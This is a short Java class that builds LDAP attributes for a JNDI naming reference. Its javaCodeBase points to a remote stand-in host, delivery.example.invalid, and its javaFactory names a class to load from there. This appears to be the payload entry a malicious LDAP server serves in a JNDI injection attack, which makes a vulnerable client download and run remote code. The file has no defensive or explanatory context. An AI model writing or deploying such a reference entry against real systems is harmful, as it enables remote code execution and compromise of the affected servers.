import javax.naming.directory.BasicAttribute;
import javax.naming.directory.BasicAttributes;

public class LdapReference {
    public static BasicAttributes attributes() {
        BasicAttributes attrs = new BasicAttributes();
        attrs.put(new BasicAttribute("objectClass", "javaNamingReference"));
        attrs.put(new BasicAttribute("javaFactory", "RenamedFactory"));
        attrs.put(new BasicAttribute("javaCodeBase", "https://delivery.example.invalid/classes/"));
        return attrs;
    }
}
